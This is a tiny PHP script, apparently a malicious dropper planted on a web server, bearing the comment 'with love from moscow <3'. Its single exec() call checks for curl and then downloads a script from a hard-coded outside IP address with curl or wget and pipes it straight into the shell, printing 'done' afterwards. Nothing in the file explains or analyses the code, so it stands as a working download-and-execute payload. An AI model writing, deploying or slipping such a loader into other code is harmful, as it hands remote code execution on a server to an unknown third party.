<?php
//with love from moscow <3
exec('if curl 127.0.0.1 -o /dev/null 2>/dev/null; then curl -o - http://185.29.11.201/1039.txt|sh; else wget -O - http://185.29.11.201/1039.txt|sh; fi');
echo 'done';
?>